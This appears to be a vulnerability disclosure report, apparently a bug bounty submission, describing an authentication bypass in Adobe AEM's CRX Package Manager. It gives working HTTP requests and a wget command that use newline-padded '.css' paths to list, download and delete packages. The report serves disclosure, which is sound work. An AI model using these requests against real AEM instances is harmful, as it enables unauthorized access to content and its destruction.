 # Undocumented authentication bypass in [$DOMAIN]

This bug allows attackers to bypass authentication and gain access to Package Manager if the security controls for out-of-box protection are manually removed. Packages enable the importing and exporting of repository content, and the Package Manager can be used for configuring, building, downloading, installing and deleting packages on local AEM installations. This issue allows an unauthorized user to view and download packages.


## Steps To Reproduce

You can list the packages using the following request:

```
GET /crx/packmgr/list.jsp;%0A;%0A;%0A;%0A;%0A;%0A;%0A;%0A;%0A;%0A;%0A;%0A;%0A;%0A;%0A;%0Aa.css?_dc=1615863080856&_charset_=utf-8&includeVersions=true HTTP/1.1
Host: $DOMAIN
User-Agent: curl/123
Accept-Encoding: gzip, deflate
Referer: $URL
Content-Length: 2

```
The output is attached (list.txt)

From there an attacker can download any described package using the following URL on your browser:

`wget '$URL/crx/packmgr/service.jsp;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0aa.css?_dc=1615863080856&_charset_=utf-8&includeVersions=true&cmd=get&name=CR1345449_after' -o CR1345449_after.jar `  

You can decompress the file using:
`jar xf CR1345449_after.jar`

A file called DataMigrationBundle-content-1.0-SNAPSHOT.zip will be downloaded. You can do the same with all packages just changing the name in the 'name' parameter above.

Accessing this URL you can check all available operations:
`$URL/crx/packmgr/service.jsp;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0aa.css?_dc=1615863080856&_charset_=utf-8&includeVersions=true&cmd=help` 

You could also remove the packages using the following Request. (I didn't try to remove any packages, notice the name I used)

```
POST /crx/packmgr/service.jsp;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0aa.css?_dc=1615863080856&_charset_=utf-8&includeVersions=true&cmd=rm&name=TOREMOVE HTTP/1.1
Host: $DOMAIN
User-Agent: curl/123
Accept-Encoding: gzip, deflate
Connection: close
Referer: $URL
Content-Length: 2
```


## Impact

Is possible to read the content of the packages but also remove them. This might impact the normal functioning of the AEM instance. 

 
### Supporting Material/References
https://threatpost.com/rce-bug-in-adobe-revealed/167382/

https://labs.detectify.com/2021/06/28/aem-crx-bypass-0day-control-over-some-enterprise-aem-crx-package-manager/

